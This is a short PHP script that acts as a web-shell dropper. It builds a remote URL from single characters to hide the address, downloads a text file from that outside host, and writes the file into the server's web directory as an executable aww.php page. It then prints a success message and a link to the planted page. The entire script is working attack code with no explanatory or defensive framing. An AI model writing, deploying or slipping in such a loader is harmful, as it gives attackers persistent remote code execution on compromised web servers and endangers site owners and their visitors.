<?php
header("Content-type:text/html;Charset=utf-8");
$url = "h"."t"."t"."p:"."/"."/"."w"."w"."w."."x"."x"."s"."s".".l"."o"."l"."/"."1."."t"."x"."t";
$php = @file_get_contents( $url);
@file_put_contents(dirname(__FILE__).'/aww.php', $php );
echo "SUCCESS！";
echo "<BR>"; 
echo "<BR>"; 
$dir =  str_replace($_SERVER["DOCUMENT_ROOT"],"",dirname(__FILE__) );
$url = "http://".$_SERVER['HTTP_HOST'].'/'.$dir.'/aww.php';
echo "<a href='{$url}'>GO TO PAGE</a>";